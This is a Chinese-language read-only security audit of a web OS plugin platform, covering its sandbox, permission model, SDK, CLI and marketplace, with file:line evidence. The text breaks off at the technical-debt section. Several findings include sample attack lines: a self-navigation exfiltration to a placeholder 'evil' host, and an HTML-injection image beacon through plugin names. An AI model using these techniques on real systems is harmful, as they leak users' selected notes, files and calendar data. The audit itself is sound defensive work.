# Part C · 插件生态 / 开发者平台 / SDK / CLI / 沙箱 审计

> 对象：Guandao OS 2.0 预备审计 · 仓库 `C:\Users\1\Desktop\my-homepage`（`package.json` version = 1.9.0）
> 方式：**只读**代码审计，未修改任何源码，未执行 `npm run qa:plugins` / Playwright（见 §8）。
> 证据格式：`文件:行号`，全部为本次实际读取的代码位置。

**结论速览**：沙箱的隔离骨架是**真的**（双层 `sandbox="allow-scripts"` + opaque origin + MessageChannel + 服务端二次校验），但它不是"安全边界完整"的实现：唯一的外泄通道（插件自行导航）只做事后封禁（§5-1），供应链只有哈希没有签名（§5-2），SDK 与 Broker 表已经漂移（§5-7），版本号出现 1.7 / 1.8 / 1.9 三份真相（§5-5）。

---

## 1. 插件运行时与沙箱（含时序）

### 1.1 三层结构与执行位置

| 层 | 文档 | sandbox 属性 | origin | 证据 |
| --- | --- | --- | --- | --- |
| L0 宿主 | `https://guandao.xin` 主页面 | — | 同源 | `worker/index.js:92-94` |
| L1 运行器 | `/sandbox/runner`（静态资源，Worker 加 CSP） | `allow-scripts` | opaque | `src/lib/plugins/host.ts:193`、`host.ts:34` |
| L2 插件 | `blob:` URL 自包含文档 | `allow-scripts` | opaque | `public/sandbox/runner.html:138`、`runner.html:163-172` |

- 插件**不在主页面执行**：宿主只为它创建一个 iframe，`src` 指向运行器（`host.ts:191-197`）。插件代码本体永远在 L2，宿主只把 SDK 文本与 HTML 通过 `postMessage` 递进去（`host.ts:242-272`）。
- L2 的 `sandbox` 是运行器自己设的，注释明确"同样只允许 allow-scripts"（`runner.html:137-143`）；没有任何 `allow-same-origin` / `allow-popups` / `allow-forms` / `allow-top-navigation` / `allow-downloads` / `allow-modals`。
- 因此 `location.origin === "null"`（`tests/e2e/sandbox.spec.ts:111-144` 断言属性；`scripts/plugins-ui-qa.mjs:145-146` 断言 origin；`plugins-ui-qa.mjs:148-164` 断言父 DOM / localStorage 不可读）。

### 1.2 启动时序（实测代码路径）

1. `new PluginSandbox()` 建 iframe，挂 `window.message` 监听，登记到 `sessions`（`host.ts:191-208`）。
2. 运行器脚本末尾发 `HELLO` + 随机 nonce（`runner.html:344-345`）。
3. 宿主只接受 `event.source === iframe.contentWindow` 且 `channel === "guandao.plugin.sandbox"` 的 HELLO，**不校验 `event.origin`**（`host.ts:215-225`；理由见 `host.ts:5-8`：opaque origin 的 origin 恒为 `"null"`，谁都可以是 null）。
4. 宿主 `loadSdk()` + `loadEntryHtml()`（`host.ts:104-130`），后者从 IndexedDB 取包并**重新跑一遍 `verifyBundle`**，摘要不符即拒绝启动（`host.ts:126-127`）。
5. 宿主建 `MessageChannel`，把 `port2` 随 `MOUNT` 转移给 iframe，`targetOrigin = "*"`（`host.ts:244-272`；`*` 在 opaque iframe 上不可避免）。
6. 运行器校验 `event.source === window.parent`（`runner.html:105`）、MOUNT 只接受一次（`runner.html:108`）、**必须带回 nonce**（`runner.html:120-123`）。nonce 用于防"frame 被导航后新文档接管端口"。
7. 运行器把 `<meta CSP>` + `window.__GUANDAO_PLUGIN__` + SDK 注入插件 HTML 的 `<head>`（`runner.html:154-157`、`317-333`），用 Blob URL 装载（`runner.html:161-172`）。
8. 插件 iframe `load` → 运行器通过端口发 `READY`（`runner.html:195`）→ 宿主 resolve ready（`host.ts:299-305`）。首帧 12 秒不 READY 则 `fail()`（`host.ts:274-277`）。
9. 之后插件 SDK 用 `window.parent.postMessage` 发 RPC（`sdk.js:78-87`）→ 运行器校验 source/requestId/method 正则/64KB 上限，并**用 mount 时的 pluginId 覆盖插件自报值**（`runner.html:238-274`）→ 宿主按 `METHOD_PERMISSION` 校验权限/频率/体积/超时（`host.ts:358-408`）→ 回 `RESULT`。

### 1.3 通信鉴权结论

- 三处都用 **`event.source` 身份比对**，没有一处用 `event.origin` 做身份判断：`host.ts:217-218`、`runner.html:105`、`runner.html:241`、`sdk.js:97`。对 opaque origin 而言这是正确做法。
- 插件自报 `pluginId` 不被采信：运行器覆盖（`runner.html:266-273`），宿主再做一次 `data.pluginId !== this.record.id` 丢弃（`host.ts:327`）。
- 插件直接 `postMessage` 给 `window.top` 无效：宿主的 `event.source` 是 L1 的 contentWindow，L2 对不上（`host.ts:218`）。
- 运行器拒绝非 RPC 消息（`runner.html:244`），`DESTROY` 只走端口（`runner.html:233-235`），插件无法伪造销毁或 RESULT。

### 1.4 CSP

- Worker 对 `/sandbox/*` 下发独立策略：`default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; media-src data: blob:; font-src data:; connect-src 'none'; frame-src 'self' data: blob:; base-uri 'none'; form-action 'none'; frame-ancestors 'self'`（`worker/index.js:39-51`、`85-90`）。
- 主页面 CSP 是哈希白名单、无 `unsafe-eval`、`frame-src 'self' blob: data:`（`worker/index.js:26-28`、`53-70`）。主页面 `X-Frame-Options: DENY`，沙箱页显式删除 XFO（`worker/index.js:85-95`）。
- 运行器**再加一层**：把同一份策略写进插件文档 `<meta>`（`runner.html:68-79`、`154`）。注释承认不能依赖 blob 文档继承策略（`runner.html:141-142`）。
- 关键限制：`runner.html:142` 的 `frame.setAttribute("csp", ...)` 在当前浏览器是**无效属性**（这是已废弃的 CSP Embedded Enforcement 提案），真正生效的是 `<meta>`。属于"看起来更安全"的装饰性加固。
- `script-src 'unsafe-inline'` 是必需的（插件本身就是文档），因此插件文档内任何 HTML 注入都是插件自己的代码执行——这不算逃逸，但意味着"插件包内容审查"不能只看 manifest。

### 1.5 超时、限频、崩溃隔离

| 机制 | 值 | 证据 | 评价 |
| --- | --- | --- | --- |
| RPC 频率 | 60 次 / 10 s | `host.ts:36-37`、`347-356` | 生效 |
| 通知频率 | 5 条 / 60 s | `host.ts:40-41`、`432-435` | 生效（独立计数） |
| 单次 payload | 24 KB（宿主） / 64 KB（运行器） | `host.ts:39`、`374-377`；`runner.html:60` | 宿主更严，运行器宽松，无风险 |
| 宿主处理超时 | 8 s | `host.ts:38`、`394-396` | `Promise.race`，失败返回 `TIMEOUT` |
| SDK 兜底超时 | 12 s | `sdk.js:18`、`69-73` | 生效 |
| 启动超时 | 12 s（仅到 READY） | `host.ts:274-277` | **READY 之后无任何看门狗** |
| 命令插件寿命 | 20 s 后 `destroy` | `host.ts:914-915` | 生效 |

**崩溃隔离的真相**：没有 CPU/内存隔离，也没有心跳。插件是 `blob:` 文档，与宿主同 site，浏览器通常把它放进**同一渲染进程**；一个 `while(true)` 会直接卡死整个 OS 标签页。管理器自己也承认拿不到 iframe 的 CPU/内存（`src/lib/plugins/manager.ts:342`），但 `host.ts:11` 的注释"插件卡死只影响自己的 iframe"是**过度声明**。渲染层崩溃（OOM）也没有处理：L1 有 `error` 监听（`runner.html:199-201`），L0 没有，`host.ts` 只监听 `message`。

---

## 2. 权限模型核查

### 2.1 清单与默认拒绝

- 权限目录 17 项，带 `module / risk / sensitive / network` 元数据（`shared/plugin-spec.js:88-242`）。
- **未知权限在 Schema 层直接拒绝**，不是"忽略"：`shared/plugin-spec.js:518-527`（`UNKNOWN_PERMISSION`）。
- 运行时默认拒绝：方法不在 `METHOD_PERMISSION` 表 → `UNKNOWN_METHOD`（`host.ts:367-370`）；在表里但 `record.granted` 不含 → `PERMISSION_DENIED`（`host.ts:384-392`）。
- 服务端默认拒绝（第二道）：安装时校验 `granted ⊆ manifest.permissions`（`worker/api/plugins/handlers.js:489-494`）；更新时校验新增权限需显式同意（`handlers.js:596-615`）；回退取交集（`handlers.js:663-665`）；网络代理再校验一次（`handlers.js:1161-1167`）。
- **结论：不是"只在 UI 隐藏按钮"。** UI 只是入口，Broker 与服务端各自独立校验。

### 2.2 授予 / 撤销

- 授予：安装弹窗逐项勾选（`src/lib/plugins/ui-kit.ts:168-274`），返回勾选数组；`[]` 视为"一项都不给但仍安装"（`ui-kit.ts:268-273`）。
- 撤销：`saveGrantedPermissions` 先 `destroySessionsFor(id)` 再落库（`registry.ts:487-502`），所以"撤销后立即拒绝"成立——但只在**当前标签页**成立（见 §2.4-b）。
- 服务端同步：market 来源额外调 `/permissions`（`registry.ts:494-497`、`api.ts:260-261`）。

### 2.3 插件能直接触达什么

| 能力 | 是否可达 | 证据 |
| --- | --- | --- |
| 宿主 DOM | 否（opaque，跨源访问抛异常） | `runner.html:138`、`plugins-ui-qa.mjs:148-155` |
| Cookie | 否（opaque origin + HttpOnly） | `runner.html:43-48`、`api.ts:5` |
| localStorage | 否（沙箱内访问抛 SecurityError） | `plugins-ui-qa.mjs:157-164` |
| IndexedDB | 否（同 opaque 限制，无同源） | 同上机制；仓库无任何绕过代码 |
| fetch / XHR / WS | 否（`connect-src 'none'`） | `worker/index.js:46`、`runner.html:75` |
| D1 / R2 Binding | 否（Binding 只在 Worker，浏览器侧无） | `worker/index.js:111-113`、`wrangler.jsonc`（DB/FILES 仅 Worker） |
| 主页面函数 / 变量 | 否（只能 postMessage） | `host.ts:218` |

### 2.4 可利用路径（按可利用性排序）

**a) 自我导航外泄（最实用的外泄通道，也是代码注释自己承认的那一条，且只做事后封禁）**
插件可 `location.href = "https://evil/?d=" + data`：自我导航不受 `connect-src` 约束，沙箱也没有 `allow-top-navigation` 限制"导航自己"。运行器用"第二次 `load` 事件"检测（`runner.html:173-196`），宿主收到 `sandbox:navigation` 后写日志、`enabled=false`、`blocked=true`（`host.ts:313-325`）。**问题：数据在检测前已经出网**，且封禁只写本地 localStorage（`host.ts:318`），不上报服务端、不影响其他用户。

**b) 跨标签页的陈旧授权（撤销不跨窗口）**
`sessions` 是模块级 Map（`host.ts:91`），`destroySessionsFor` 只作用于当前 window（`host.ts:844-849`）。运行时权限判定读的是构造时快照 `this.record.granted`（`host.ts:344`、`385`），不是每次读 localStorage。因此在 A 标签页撤销权限后，B 标签页里正在运行的会话仍持有旧授权，直到 B 刷新。

**c) 跨设备静默授权**
登录状态下，服务端安装记录会"按已授权权限静默恢复，不再弹权限框"（`registry.ts:100-148`，注释在 `110`）。在设备 B 上打开页面即自动安装并继承设备 A 的 `files.read_selected` / `notes.read_selected` 等高敏权限，**没有二次确认、没有设备级差异化同意**。

**d) `window.open` 是装饰性权限**
权限目录里有 `window.open`（`plugin-spec.js:89-97`），但全仓库唯一引用是 `commands.ts:90`（决定"打开应用窗口"还是"起隐藏上下文"）。`METHOD_PERMISSION` 里没有任何方法映射到它（`host.ts:63-89`），`registerApp` 也不检查（`registry.ts:549-607`）。即：不申请 `window.open` 的插件照样拿到窗口。同理 `contributes.fileHandler` 只被校验（`plugin-spec.js:608-628`），运行时没有任何"把文件交给插件"的 RPC（`host.ts` 全表无 `file.*` 方法），`file-handler` 类型是空能力。

**e) 存储总量可压垮宿主**
单插件 256 KB / 128 键（`plugin-spec.js:27-28`、`store.ts:149-170`），但 24 个插件上限（`plugin-spec.js:26`）× 256 KB ≈ 6 MB，超过多数浏览器 localStorage 5 MB 配额；插件数据与宿主数据同库（`store.ts:17`、`167`），配额耗尽会拖垮笔记/日历/主题等宿主功能。

**f) 卸载残留：主题写入宿主主题库**
`theme.apply` 调用 `saveCustomTheme`（`host.ts:523-525`），主题 id 为 `custom-<pluginId>`（`themes.ts:489-494`、`522-529`）；卸载只清插件存储与包（`registry.ts:504-528`，最终 `store.ts:194-197`），**不删主题**。主题插件卸载后仍留在主题中心。

**g) 服务端代理的信任面**
`/api/plugins/net` 以用户 Session 认证，按"当前安装版本"的 manifest 域名白名单放行（`handlers.js:1152-1184`），仅允许 https/443/无凭据（`1176-1178`），禁跳转（`1209-1211`），响应截断 256 KB（`1212-1215`），每次写审计（`1216-1221`）。**没有内容检查 / DLP**：拿到 `network.fetch` 的插件可把用户数据发到它声明的任意域名；审计只记 host+status+bytes，不记完整 URL（`1220`）。

> 说明：服务端接受客户端自选的 `granted` 子集（`handlers.js:489-494`）是**设计正确**的（用户自己的浏览器替自己选择），不算越权。

---

## 3. SDK 能力矩阵

SDK 是 `public/sandbox/sdk.js`（368 行），宿主注入，全局 `guandao`，`Object.defineProperty` 只读（`sdk.js:357-361`）。所有方法返回 Promise，失败 reject 带 `code` 的 Error（`sdk.js:23-28`）。

| SDK | 是否存在 | 文档完整性 | 版本化 | 证据 |
| --- | --- | --- | --- | --- |
| `guandao`（根：pluginId / granted / has / context / sdkVersion） | ✅ | 部分（`docs/PLUGINS-1.7.md:155-186`、`developers.astro:347-393` 均未列 `has()`） | `sdkVersion: 1` 硬编码（`sdk.js:140`） | `sdk.js:139-152` |
| Application (`guandao.app`) | ⚠️ 存在但极薄：context/close/setTitle/resize/openApp，无最小化/最大化/位置/全屏 | 文档未单列 `app.*`，只在 ui 下写"setTitle/resize/close" | 无 | `sdk.js:196-212`；`host.ts:473-495` |
| Widget (`guandao.widget`) | ⚠️ `setEnabled` 可用；`setTitle` **不存在** | 未文档化（文档只写 `setEnabled`） | 无 | `sdk.js:214-221` vs `host.ts:63-89`、`410-633` → 调用必得 `UNKNOWN_METHOD` |
| Plugin 元信息 | ✅ pluginId / granted / context() | ✅ | 仅 `sdkVersion` 整数 | `sdk.js:141-152`、`host.ts:413-423` |
| UI (`guandao.ui`) | ✅ toast/notify/dialog/openApp/setTitle/resize/close/theme | ⚠️ 无参数表、无返回结构、无错误码；`ui.toast` 文档写"限频"，实际只受全局 RPC 限频 | 无 | `sdk.js:154-194`；`host.ts:425-527` |
| Storage (`guandao.storage`) | ✅ get/set/delete/keys/clear | ✅ 含键正则与配额 | 无（配额随 OS 版本变） | `sdk.js:121-137`；`store.ts:144-191` |
| Notification (`guandao.notifications`) | ✅ show/success/warning/error | ✅ | 无 | `sdk.js:223-241`；`host.ts:432-443` |
| File (`guandao.files`) | ⚠️ 只读文本：pick/read；`multiple` 参数被静默忽略；无保存/导出/写入 | ⚠️ 文档写 `pick({accept, multiple})`，实际单文件 | 无 | `sdk.js:245-256` vs `host.ts:653-704`；`developers.astro:369` |
| Theme (`guandao.theme` / `ui.theme`) | ✅ get/apply（apply 仅主题类型插件） | ✅ | 无 | `sdk.js:258-265`；`host.ts:497-526` |
| Commands | ✅ register/onInvoke | ✅（含"只能子集"约束） | 无 | `sdk.js:267-283`；`host.ts:544-560` |
| Calendar / Notes | ✅ readSelected/createEvent / readSelected/create | ✅（选择器语义写清） | 无 | `sdk.js:285-312`；`host.ts:568-623` |
| Network | ✅ fetch（走宿主代理） | ✅ 返回结构有文档 | 无 | `sdk.js:314-324`；`host.ts:706-726` |
| Device | ⚠️ 纯本地 `navigator` 读取，不经宿主（沙箱里 `navigator` 本来就有） | ✅ | 无 | `sdk.js:326-338` |
| Lifecycle | ✅ ready/on/reportError（+ 别名 `app.lifecycle`、`notify`） | ✅ | 无 | `sdk.js:340-355` |

**类型与版本**：`shared/plugin-spec.d.ts` 只覆盖 Manifest / 权限 / 包结构（`plugin-spec.d.ts:1-148`），**没有 SDK 的 `.d.ts`**；文档自己承认（`PLUGINS-1.7.md:188`、`598`）。没有错误码枚举表，`code` 是散落在各处的字符串（`host.ts:360/364/368/375/388/393` 等）。

**不一致清单（都能在运行时复现）**：
1. `guandao.widget.setTitle()` → `UNKNOWN_METHOD`（`sdk.js:218-220` 无对应 Broker 方法）。
2. `guandao.files.pick({multiple:true})` → 仍只返回 1 个文件（`host.ts:677`）。
3. 组件里调 `guandao.ui.setTitle()` → 宿主找不到 `.win-title` 节点，**返回 `{ok:true}` 但什么也没发生**（`host.ts:473-479`），与 `sdk.js:10` "不存在静默降级"矛盾。
4. 组件里 `ui.resize` → `UNSUPPORTED`（`host.ts:482`），文档未说明组件不支持。
5. `guandao.device.info()` 未经宿主，`window.innerWidth` 是插件 frame 尺寸而非桌面尺寸，语义与文档"只读环境"有偏差。

### 3.1 插件 spec 版本与兼容策略（对应问题 4）

| 项 | 现状 | 证据 |
| --- | --- | --- |
| `MANIFEST_VERSION` | `1`，不等于 1 直接拒绝 | `plugin-spec.js:17`、`444-446` |
| `PLUGIN_FORMAT_VERSION` | `1`，不等于 1 直接拒绝 | `plugin-spec.js:19`、`757-760` |
| `SDK_VERSION` | `1`；插件声明 `sdkVersion > 1` **在上传阶段就被拒** | `plugin-spec.js:16`、`511-516` |
| `minimumOSVersion` 默认值 | 缺省视为 `1.7.0`（不报错） | `plugin-spec.js:507` |
| 安装时校验 | ✅ 客户端比较 `OS_VERSION`（1.9.0） | `registry.ts:200-207` |
| 更新时校验 | ❌ 完全没有；服务端 update 也不校验 | `registry.ts:356-419`、`handlers.js:566-637` |
| 回退时校验 | ❌ 没有 | `registry.ts:421-453` |
| 服务端安装校验 | ❌ 不校验 minimumOSVersion（只有客户端做） | `handlers.js:457-542` |
| 废弃策略 | ❌ 无（无 `deprecated`、无弃用通知、无迁移指引） | 全仓库无相关字段 |
| 前向兼容 | ❌ `sdkVersion > 1` 直接拒收，等于"SDK 不可演进"；升 SDK 需要服务端与全部客户端同时更新 | `plugin-spec.js:514-516` |
| 更新时重校验权限 | ✅ 客户端 `PluginConsentRequired`（`registry.ts:369-381`）+ 服务端 409（`handlers.js:601-609`） | 这一条是成立的 |

---

## 4. Developer Center / CLI 状态表

### 4.1 CLI（`cli/guandao.mjs`，843 行，零依赖）

| 命令 | 真实实现 | 可离线 | 证据 | 备注 |
| --- | --- | --- | --- | --- |
| `create` | ✅ 生成 manifest + src/ + icon + README | ✅ | `cli/guandao.mjs:361-437` | 模板把 `minimumOSVersion` 写死 `1.7.0`（`403`） |
| `validate` | ✅ 跑真实 `validateManifest` + 路径/体积/入口 | ✅ | `cli/guandao.mjs:443-454`、`165-186` | 与浏览器/服务端共用 `shared/plugin-spec.js`（`26-32`） |
| `build` | ✅ | ✅ | `cli/guandao.mjs:456-469` | |
| `package` | ⚠️ **与 `build` 是同一个函数**（`831-832` 两行都调 `buildCommand`），产物都是 `dist/<id>-<version>.gplug` | ✅ | `cli/guandao.mjs:831-832` | 文档把两者描述成不同命令（`PLUGINS-1.7.md:312-314`） |
| `dev` | ✅ 起 `127.0.0.1` HTTP，注入真 SDK + 手写 Mock Host | ✅ | `cli/guandao.mjs:694-757`、`603-670` | 绑定 127.0.0.1（`749`）；**Mock Host 把所有 manifest 权限全授予**（`731`）、**没有任何 CSP**（`603-670` 无 CSP 注入）→ 预览行为与生产不一致（生产是默认拒绝 + connect-src none） |
| `preview` | ✅ 从 `.gplug` 读，校验 `filesDigest` 后渲染 | ✅ | `cli/guandao.mjs:705-720` | 找不到包会自动先 build（`711`） |
| `publish` | ✅ 三步真请求：`POST /api/developer/plugins` → `/versions` → `/submit` | ❌（必须联网 + Cookie） | `cli/guandao.mjs:790-816` | **没有"假成功"**：create 检查 200 或 `ID_TAKEN`（`798-800`），upload 非 200 抛错（`806-810`），submit 非 200 抛错（`813-814`） |
| `test` | ❌ **不存在** | — | usage `53-75`、dispatch `827-839` 均无 | 任务清单里的 `test` 子命令未实现；SDK 侧也没有单测（`vitest.config.ts` 只收 `tests/unit/**`，无插件 spec 测试） |

CLI 其他问题：
- `CLI_VERSION = "1.0.0"`（`cli/guandao.mjs:34`）与 OS 1.9.0 无关联、无兼容性检查；`cli/package.json` 描述也停在 1.7。
- `publish` 用 `--cookie` 明文传 Session（`768-770`），会进 shell history；没有 token / 环境隔离。`--url` 必须与 `APP_ORIGIN`（或请求 origin）一致，否则被 `assertSameOrigin` 拒绝（`worker/api/plugins/common.js:13-23`）。
- 帮助信息只列用法，没有退出码、没有 `--help <command>`、没有 `--json`。
- `dev` 是**第三份协议实现**（`HARNESS_JS`，`475-571`），与 `host.ts`、`runner.html` 逻辑平行演化。

### 4.2 Developer Center（`src/lib/plugins/developer.ts`，747 行）

| 能力 | 状态 | 证据 |
| --- | --- | --- |
| 登录门禁 | ✅ 401 → `loginGate` | `developer.ts:101-122`、`435-439` |
| 创建草稿 | ✅ 真 POST | `developer.ts:671-691`、`api.ts:304-311` |
| 上传版本 | ✅ 文件选择 → 客户端 `validateBundle` → 真 POST；失败逐条展示服务端 `issues` | `developer.ts:476-529`、`522-528` |
| 提交 / 撤回 / 删除 | ✅ | `developer.ts:566-596` |
| 审核（通过/拒绝/下架/推荐/限制） | ✅ staff 才显示，服务端 `requireStaff` | `developer.ts:597-659`、`431`；`handlers.js:885-1136` |
| 审计日志 | ✅ 真读 | `developer.ts:413-426`、`handlers.js:918-939` |
| **包内容审查** | ❌ 审核卡只显示 manifest 权限、checksum 前 16 位、changelog（`developer.ts:344-360`），没有包内文件/diff 视图 | 审核员必须自己下载 `.gplug` 才能看代码 |

### 4.3 插件市场数据真实性（对应问题 6）

| 问题 | 结论 | 证据 |
| --- | --- | --- |
| 数据来源 | **D1 真实表**，不是前端种子。市场列表只取 `p.status='published'`（`worker/api/plugins/store.js:308-346`），卡片版本取 `latestApprovedVersion`（`store.js:389-393`、`150-159`） | 无 mock 数组、无随机数 |
| 种子/兜底 | 无种子数据。离线时显示"插件目录暂时不可用"，不编造条目（`market.ts:359-367`） | ✅ 诚实降级 |
| 安装是否真生效 | ✅ 本地：校验 → IndexedDB 存包 → 写安装记录 → 注册应用（`registry.ts:301-345`）；服务端：写 `plugin_installations` + `plugin_permissions` + 审计（`handlers.js:512-541`） | 一步失败则 `purgePluginData` 回滚（`registry.ts:346-349`） |
| 更新 / 回退 / 卸载 | ✅ 都真实落库（`handlers.js:618-629`、`666-677`、`700-705`） | |
| 安装统计 | ✅ `install_count` 由 `COUNT(*) plugin_installations` 重算（`store.js:245-255`）；下载量按 `(plugin, user, version, day)` 去重后 `+1`（`handlers.js:428-437`） | 不是自增伪造 |
| 下载量真实性 | ⚠️ 只要登录并 GET `/package` 就计一次（`handlers.js:424-441`），**卸载重装/换版本可刷**；`pluginPackage` 是安装前置动作，计数口径=下载而非安装 | 设计取舍，非造假 |
| 评分 | ✅ `rating_sum/count` 由 `plugin_reviews` 聚合（`store.js:249-250`），未安装不能评价（`handlers.js:818-819`） | |
| 官方示例 | 本地内置包，不进 D1、不计入市场统计（`builtin.ts:299-461`；`PLUGINS-1.7.md:601` 已声明） | ✅ 不会污染统计 |

---

## 5. 安全隐患（按严重度）

> 严重度：**高**（可直接造成数据外泄或供应链投毒）/ **中高** / **中** / **低**。均给出可利用路径。

### 【中高】1. "插件自我导航"外泄只做事后封禁，数据已出网
`runner.html:173-196`（第二次 `load` 才判定导航）、`host.ts:313-325`（封禁 + 本地置位）。
影响：拿到 `notes.read_selected` / `files.read_selected` / `calendar.read_selected` 的插件，可把用户点选的数据拼进 URL 发往任意外域；封禁发生在数据离开之后，且 `patchInstall({enabled:false, blocked:true})` 只写本地 localStorage（`host.ts:318`），不上报服务端、不影响其他用户、重装即复活。
（`connect-src 'none'` 对"导航"无效是规范行为；沙箱也没有 `navigate-to` 支持。）

### 【中高】2. 供应链只有哈希，没有签名 / 无发布者身份
`handlers.js:479-484`（服务端比对客户端传来的 `packageHash` 与 DB 记录）、`bundle.ts:53-56`（客户端比对同一 API 返回的 `checksum`）、`migrations/0010_plugins.sql:75-93`（`plugin_versions` 只有 `package_sha256`，无 `signature` / `publisher_key`）。
影响：哈希由**同一个服务端**给出，只能发现传输损坏或 R2 与 DB 不一致，无法证明"这版是该作者发的"。任何能写 R2/DB 的人、或被钓鱼/被盗号的审核员批准的一版，会以"校验通过"的姿态装到所有用户机器上。审核环节也没有包内容 diff（§4.2）。

### 【中】3. 更新路径不重新校验 `minimumOSVersion` / `sdkVersion`
安装校验在 `registry.ts:200-207`；更新 `registry.ts:356-419` 完全没有这两段；服务端 `handlers.js:566-637` 也不校验任何兼容字段。
影响：作者可以发一版 `minimumOSVersion: "2.0.0"`，1.9 客户端会照常升级，随后调用不存在的 API 全部 `UNKNOWN_METHOD`，用户侧表现为"更新后插件坏了"，且没有回滚提示（`rollback` 需要手动点）。

### 【中】4. 跨设备静默授权（无二次同意）
`registry.ts:107-145`，注释明确"按已授权权限静默恢复，不再弹权限框"（`110`）。
影响：设备 A 上授予的 `files.read_selected` 等敏感权限，在设备 B 首次打开页面时被自动继承，用户未参与同意；与"逐项授权、默认拒绝"的产品承诺冲突。

### 【中】5. 版本号三份真相：1.7 / 1.8 / 1.9
- `shared/plugin-spec.js:15` `OS_VERSION = "1.8.0"`（在 1.9 仓库里）。
- `src/lib/version.ts:12` `OS_VERSION = "1.9.0"`；`worker/api/version.js` `1.9.0`；`package.json` `1.9.0`。
- 后果 A：`/api/plugins/meta` 返回 `osVersion: "1.8.0"`（`handlers.js:31`、`88`），市场与开发者中心显示错误版本；`app.context` 也回 1.8.0（`host.ts:419`），插件据此做的版本分支全部错。
- 后果 B：安装时的最低版本比较用 **1.9.0**（`registry.ts:38` 从 `../version` 导入），而报给插件的是 1.8.0 —— 同一系统两个版本号。
- 后果 C：`scripts/check-version.mjs:9-42` 只检查 `package.json / version.ts / worker / sw.js`，**不覆盖 `shared/plugin-spec.js`**，所以 `npm test` 通过。
- 后果 D：`scripts/plugins-qa.mjs:135` 仍断言 `osVersion === "1.7.0"`，`plugins-qa.mjs:94` 构造的 manifest 也是 1.7.0 —— 文档声称的 65/65 全过在当前代码上不可能成立（见 §8）。

### 【中】6. 无 CPU / 崩溃看门狗，"卡死只影响自己"不成立
`host.ts:274-277` 只覆盖启动阶段；`host.ts:11` 的注释与 `manager.ts:342` 的说明互相矛盾。
影响：插件 `while(true)` 或超大 DOM 会冻结整个 OS 标签页（blob 文档与宿主同 site，通常同渲染进程）；没有心跳、没有强杀、没有"插件无响应"提示。

### 【中】7. SDK 表面与 Broker 表漂移
`widget.setTitle` 不存在（`sdk.js:218-220` vs `host.ts:63-89`）；`ui.setTitle` 在组件模式下静默成功（`host.ts:473-479`）；`files.pick multiple` 被忽略（`sdk.js:249` vs `host.ts:677`）。
影响：开发者按文档写出的代码在真实系统里"有时没反应"，而这正是最容易被误判为"平台 bug"的部分；更糟的是静默成功掩盖了失败。

### 【中】8. `window.open` 权限不生效 / `file-handler` 是空能力
`plugin-spec.js:89-97` 定义了权限，`METHOD_PERMISSION`（`host.ts:63-89`）无对应项，`commands.ts:90` 是唯一引用；`plugin-spec.js:608-628` 校验 `fileHandler`，但 `host.ts` 无任何 `file.*` 方法。
影响：权限清单与实际能力不一致（用户看到的授权项并不对应真实资源）；`file-handler` 插件装完后没有任何文件事件。

### 【中】9. 宿主窗口标题存在 HTML 注入（插件名未编码）
`index.astro:5007` `<span class="win-title">${app.title}</span>` 直接进 `innerHTML`，`app.title` 来自 `registry.ts:553` 的 `record.name`，而 manifest `name` 只校验长度 2–48、**不校验字符集**（`plugin-spec.js:455-458`）。另一个同类 sink：`index.astro:1557`（程序坞选择器）。
影响：恶意插件名可注入任意 HTML/内联样式到**宿主源**：UI 伪造、`<img src=https://evil/...>` 信标（主 CSP 的 `img-src` 允许 https，`worker/index.js:58`）。脚本执行被脚本哈希白名单挡住（`worker/index.js:26-28`），故为 HTML 注入而非 XSS。

### 【低中】10. 撤销不跨标签页
`host.ts:91`（模块级 sessions）、`host.ts:344/385`（授权快照）。
影响：多标签页使用时，A 页撤销后 B 页仍可用旧授权，直到刷新。

### 【低中】11. 插件存储总量可耗尽宿主 localStorage
`plugin-spec.js:26-28`（24 个 × 256 KB ≈ 6 MB）、`store.ts:167`（同库写入）。
影响：可用性——宿主其它应用写盘失败（`ls.set` 返回 false），UI 表现为"保存失败"。

### 【低】12. 卸载残留主题
`host.ts:523-525` → `themes.ts:522-529`；`registry.ts:504-528` 未调 `deleteCustomTheme`（`themes.ts:531-536` 存在但没人调用）。

### 【低】13. `blocked` 仅本地生效、不上报
`host.ts:314-323`。
影响：恶意插件只在本机被封；作者无成本，其他用户无保护；服务端报表看不到这类事件。

### 【低】14. 审核看不到包内容
`developer.ts:344-360`（只有 manifest / checksum / changelog）。
影响：审核质量依赖人工下载，等于把供应链安全寄托在流程纪律上。

### 【低】15. 网络代理审计粒度不足
`handlers.js:1216-1221` 只记 host / status / bytes，不记 path、query、method。
影响：事后取证无法还原"插件把什么数据发到了哪里"。

### 5.1 已核查为阴性（明确排除，避免误判）

| 检查项 | 结论 | 证据 |
| --- | --- | --- |
| 沙箱逃逸（拿到宿主 DOM / Cookie / 函数） | **未发现**。无 `allow-same-origin`，双层 iframe，主页面没有任何 sink 接受插件运行期字符串 | `host.ts:193`、`runner.html:138`、`host.ts:218` |
| `postMessage` 未校验来源 | **未发现**。三处都用 `event.source` 身份比对，`event.origin` 未被误用为身份 | `host.ts:217-218`、`runner.html:105`、`241`、`sdk.js:97` |
| 端口劫持（导航后接管 MessagePort） | **已阻断**。nonce 握手 + 只接受一次 MOUNT + 端口随 MOUNT 转移 | `runner.html:108`、`120-123`、`host.ts:271` |
| `allow-scripts + allow-same-origin` 组合 | 不存在 | `host.ts:193`、`runner.html:138` |
| CSP 被 `unsafe-eval` / 外部脚本绕过 | 不存在（`script-src 'unsafe-inline'`，无 `unsafe-eval`；`default-src 'none'`） | `worker/index.js:39-51` |
| 权限绕过（绕过 Broker 直接调能力） | **未发现**。所有能力都在 Broker `dispatch` 内，插件无法直接触达宿主 API | `host.ts:358-408`、`410-633` |
| 存储污染（原型链 / 跨插件读写） | **未发现跨插件**。键空间按 `plugin.storage.<id>` 隔离，键正则白名单；`__proto__` 写入不触发 setter（对象展开 + 计算属性） | `store.ts:17`、`150-154` |
| 服务端越权（他人插件 / 自审） | **未发现**。`developer_id = Session.user.id` 贯穿所有写接口；自审 403 | `developer.js:140-144`、`handlers.js:1038-1040` |
| CSRF | 所有非 GET 走 `assertSameOrigin`（Origin 或 `Sec-Fetch-Site`），当前实现非 async，无漏 await | `common.js:13-23`、`handlers.js:82`、`developer.js:55` |

---

## 6. 技术债

1. **一份协议，四份实现**：`host.ts`（宿主 Broker）、`runner.html`（转发器）、`sdk.js`（客户端 SDK）、`cli/guandao.mjs:475-571`（Mock Host）。任何方法变更要改四处，已经出现漂移（§5-7）。
